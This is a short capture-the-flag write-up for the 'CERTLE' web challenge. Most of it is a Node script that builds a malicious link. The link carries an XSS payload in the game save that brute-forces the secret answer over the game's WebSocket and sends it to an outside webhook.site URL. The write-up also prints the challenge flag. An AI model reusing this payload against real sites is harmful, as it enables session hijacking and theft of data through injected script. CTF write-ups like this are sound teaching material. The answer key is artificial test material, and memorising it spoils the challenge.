# CERTLE

There is XSS in the game save and the remote deployment has the flag as the answer for the game, so we can use the XSS to guess the flag and send it to our webhook.

Generate link with `node generate.js`:
```js
console.log(
  "https://certle.ecsc25.hack.cert.pl/#" + 
  btoa(
    JSON.stringify([
      {
        attributes: {
          style:
            "background:black;position:fixed;top:0;left:0;right:0;bottom:0;",
          onmouseover: `
            const socket = new WebSocket(\`wss://\${window.location.host}/ws\`);
            
            socket.receiveMessage = (payload) => {
              socket.send(payload);
              return new Promise((resolve, reject) => {
                socket.onmessage = (event) => resolve(event.data);
                socket.onerror = (err) => reject(err);
              });
            };

            setTimeout(async () => {
              let current = "";
              let done = false;
              const charset = "abcdefghijklmnopqrstuvwxyz_!@#$%^&*()_+-=;'<>,./?{}0123456789";

              while (!done) {
                let progress = false;

                for (let ch of charset) {
                  const attempt = current + ch;
                  const response = await socket.receiveMessage(\`{"answer":"\${attempt}"}\`);
                  const result = JSON.parse(response);

                  if (result[result.length - 1] === "green") {
                    current += ch;
                    if (ch === "}") {
                      done = true;
                    }
                    progress = true;
                    break;
                  }
                }

                if (!progress) break;
              }

              fetch("https://webhook.site/ebad5ed7-0852-43f6-ab04-5660e86306f0/?flag=" + current);
            }, 500);
          `,
        },
      },
    ])
  )
);
```
Report the link and wait for a request with the flag.

flag: `ecsc25{crane-is-my-goto-word-how-about-you?}`